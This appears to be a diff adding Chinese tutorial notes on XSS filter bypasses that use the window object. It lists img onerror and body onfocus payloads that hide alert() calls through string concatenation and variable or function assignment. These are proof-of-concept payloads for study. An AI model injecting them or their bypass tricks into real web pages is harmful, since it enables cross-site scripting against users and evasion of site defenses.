@@ -139,5 +139,31 @@
   ### window对象
   - - -
   
+  window和top类似，比如：
+  `<img src=x onerror=window.alert(1) >`
+  
+  拼接一样的
+  `<img src=x onerror=window['al'%2B'ert'](1) >`
+  
+  其他操作，参照上一章。
+  
+  
+  通过赋值，也是我们常见的，看个例子：
+  ```
+  <img src=x onerror=_=alert,_(/xss/) >
+  <img src=x onerror=_=alert;_(/xss/) >
+  <img src=x onerror=_=alert;x=1;_(/xss/) >
+  ```
+  ![18](https://ws1.sinaimg.cn/large/005DAKuvgy1g1v3d5hdwmj30uj09m3za.jpg)
+  
+  短一点的`<body/onfocus=_=alert,_(123)>`
+  
+  ![18](https://ws1.sinaimg.cn/large/005DAKuvgy1g1v3l03yfxj30uj097mxw.jpg)
+  
+  函数赋值，也比较常见
+  ```
+  <body/onfocus="a=alert,a`/xss/`">
+  
+  ```
   
   
